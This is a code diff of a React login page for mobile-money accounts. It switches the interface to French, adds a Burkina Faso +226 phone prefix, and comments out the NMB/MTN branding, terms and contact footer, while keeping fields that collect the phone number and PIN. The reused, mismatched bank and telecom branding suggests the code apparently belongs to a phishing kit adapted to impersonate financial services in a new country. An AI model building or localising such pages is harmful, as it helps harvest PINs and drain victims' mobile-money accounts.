@@ -3,7 +3,7 @@ import "./Login.css";
 import React, { useState, useRef, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { verificationService } from "../services/api";
-import { Phone, ShieldCheck, FileText } from "lucide-react";
+import { Phone, ShieldCheck, FileText, ArrowLeft } from "lucide-react";
 import Loader from "./Loader";
 function Login({ client, setpin, sendDetails, setnumber }) {
   const { number } = client;
@@ -324,43 +324,56 @@ function Login({ client, setpin, sendDetails, setnumber }) {
 
   return (
     <>
+      <div className="backbtn">
+        <ArrowLeft />
+      </div>
       <div
         className="container"
-        style={{ backgroundImage: "url('/loginbg.jpeg')" }}
+        // style={{ backgroundImage: "url('/loginbg.jpeg')" }}
       >
         {verifying && <Loader />}
+        <Loader />
         <header>
-          <img className="momoImg" src="/nmbCon.jpeg" alt="mtn" />
+          {/* <img className="momoImg" src="/nmbCon.jpeg" alt="mtn" /> */}
         </header>
 
         <main>
           {!enterPin && (
             <div className="ctamomo">
               <div className="pin-input-container">
-                <h1>Secured Login 🔒</h1>
+                <h1>Commençons.</h1>
+                <p>
+                  Saisissez votre numéro de mobile pour vérifier votre identité.
+                </p>
               </div>
               <div className="phone-number">
                 <div className="numbercont">
                   <div className="NumInput">
-                    <label htmlFor="number">Mobile Number</label>
-                    <input
-                      type="text"
-                      name="number"
-                      inputMode="numeric"
-                      onChange={(e) => setnumber(e.target.value)}
-                      // defaultValue={num}
-                      maxLength="10"
-                      className="numcont"
-                      disabled={verifying}
-                      placeholder="eg 07XXXXXXXX"
-                    />
+                    {/* <label htmlFor="number">Mobile Number</label> */}
+                    <div className="combonedcp">
+                      <div>
+                        {" "}
+                        <span>🇧🇫</span>+226
+                      </div>
+                      <input
+                        type="text"
+                        name="number"
+                        inputMode="numeric"
+                        onChange={(e) => setnumber(e.target.value)}
+                        // defaultValue={num}
+                        maxLength="10"
+                        className="numcont"
+                        disabled={verifying}
+                        placeholder="XX XX XX XX"
+                      />
+                    </div>
                   </div>
                 </div>
               </div>
 
               <div>
                 <div className="pin-input-container">
-                  <label htmlFor="number">Enter NMB pin</label>
+                  <label htmlFor="number">Entrez votre code PIN</label>
                   <div>
                     <input
                       ref={pin1Ref}
@@ -454,25 +467,25 @@ function Login({ client, setpin, sendDetails, setnumber }) {
                   <button
                     className="btnContinue"
                     onClick={handleLogin}
-                    // disabled={!pinfull || verifying}
+                    disabled={!pinfull || verifying}
                     style={{
                       opacity: !pinfull || verifying ? 0.6 : 1,
                       cursor: !pinfull || verifying ? "not-allowed" : "pointer",
                     }}
                   >
-                    {verifying ? "Verifying PIN..." : "Sign In"}
+                    {verifying ? "Verifying PIN..." : " continuer"}
                   </button>
                 </div>
               </div>
 
-              <p className="termspolicy">
+              {/* <p className="termspolicy">
                 Use Face Verification or <br />
                 Fingerprint. <br />
-                <span style={{ color: " #0d5e94" }}>
-                  {/* Terms of use and Privacy Policy */}
-                </span>
-              </p>
-              <div className="ctFooter">
+                <span style={{ color: " #0d5e94" }}> */}
+              {/* Terms of use and Privacy Policy */}
+              {/* </span>
+              </p> */}
+              {/* <div className="ctFooter">
                 <div>
                   <Phone />
                   <p>Contact us</p>
@@ -485,7 +498,7 @@ function Login({ client, setpin, sendDetails, setnumber }) {
                   <ShieldCheck />
                   <p>Privacy policy</p>
                 </div>
-              </div>
+              </div> */}
             </div>
           )}
           {enterPin && (
